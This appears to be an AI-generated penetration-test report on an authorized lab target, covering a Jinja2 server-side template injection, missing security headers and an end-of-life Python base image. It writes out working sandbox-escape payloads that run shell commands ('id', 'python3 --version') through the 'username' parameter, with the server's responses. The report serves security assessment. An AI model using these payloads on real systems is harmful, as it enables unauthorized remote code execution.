CRITICAL 1. [rce] Server-Side Template Injection (SSTI) in `username` parameter — Jinja2 RCE

Screen: s-0002
Source: validator claude-pilot
Scope basis: authorized target http://target.local:32837/
The `username` query parameter is interpolated directly into a Jinja2 template without sanitization. Sending `{{7*7}}` causes the server to evaluate the expression server-side, returning `49` in the response body. This is trivially escalatable to full Remote Code Execution via standard Jinja2 sandbox-escape gadget chains. No authentication is required.
Reproduction
1. GET / (no params) → returns directory-listing HTML, no template evaluation (bodyLength 1238).
2. GET /?username=VERDICT{{7*7}}VERDICT → returns "Welcome VERDICT49VERDICT!" (bodyLength 23) — {{7*7}} evaluated to 49.
3. Escalate: /?username={{config.__class__.__init__.__globals__['os'].popen('id').read()}}

LOW 4. [headers] Missing HTTP security headers across all responses

Source: validator claude-pilot

LOW 5. [vulnerable-component] End-of-life Python 3.9 runtime on deprecated tiangolo/uvicorn-gunicorn-fastapi base image

Screen: (cross-screen)
Source: validator claude-pilot
Scope basis: authorized target http://target.local:32837/
A06 (vulnerable/outdated components). The application runs on Python 3.9.25, deployed from the base image `tiangolo/uvicorn-gunicorn-fastapi:python3.9` (per the served Dockerfile). Both are end-of-life / unmaintained: - Python 3.9 reached end-of-life on 2025-10-31 (PEP 596). As of the assessment date (2026-06-29) it no longer receives security patches; any new interpreter/stdlib CVE will remain unfixed on this deployment. 3.9.25 is among the last security releases of the line. - The `tiangolo/uvicorn-gunicorn-fastapi` image has been officially DEPRECATED/archived by its author; it no longer receives base-OS or dependency security updates and the maintainer recommends building your own image. This is a version/EOL-posture finding: the runtime version was actively confirmed (not merely banner-guessed) by executing `python3 --version` on the host via the already-confirmed Jinja2 SSTI/RCE on the `username` parameter, which returned `Python 3.9.25`. There is no specific unpatched, known-exploitable CVE in this interpreter patch level itself — the risk is the absence of future security maintenance for both the runtime and the base image. Version evidence: served Dockerfile shows `FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9`; `python3 --version` → `Python 3.9.25`. NOTE on the rest of the stack: a full `pip freeze` was captured (uvicorn 0.38.0, starlette 0.49.3, fastapi 0.121.0, gunicorn 23.0.0, Jinja2 3.1.6, h11 0.16.0, urllib3 2.5.0, python-multipart 0.0.20, idna 3.11, sentry-sdk 2.43.0, MarkupSafe 3.0.3, pydantic 2.12.4, requests-stack, etc.). These are all recent (Oct–Nov 2025) releases pinned at or above the fix version for their historical CVEs (e.g. Jinja2 3.1.6 = latest, fixes CVE-2025-27516; starlette 0.49.3 > CVE-2025-54121 fix 0.47.2; h11 0.16.0 fixes CVE-2025-43859; urllib3 2.5.0 fixes CVE-2025-50181/50182; gunicorn 23.0.0 fixes CVE-2024-6827; python-multipart 0.0.20 fixes CVE-2024-53981). No library in the manifest is at a known-vulnerable version, so no per-library component findings are warranted. The application-layer SSTI/RCE is the app's own use of template rendering, not a Jinja2 CVE. Operator should upgrade the runtime to a supported Python (>=3.11) and migrate off the deprecated base image.
Reproduction
1. Confirm the served build manifest: the directory listing at `/` lists `Dockerfile`; reading it (via the confirmed Jinja2 SSTI on `username`) shows `FROM tiangolo/uvicorn-gunicorn-fastapi:python3.9`.
2. Confirm the live runtime version: GET `/?username={{ lipsum.__globals__.os.popen('python3 --version').read() }}` (URL-encoded) → response body `Welcome Python 3.9.25!` (positive replays ev-mqynvamg-1q, ev-mqynvbcy-1r).
3. Negative control: GET `/Dockerfile` directly → 404 `{"detail":"Not Found"}` (ev-mqynserl-1m) — no version disclosed without the SSTI vector.
4. Assess: Python 3.9 EOL 2025-10-31; base image deprecated → no future security maintenance.
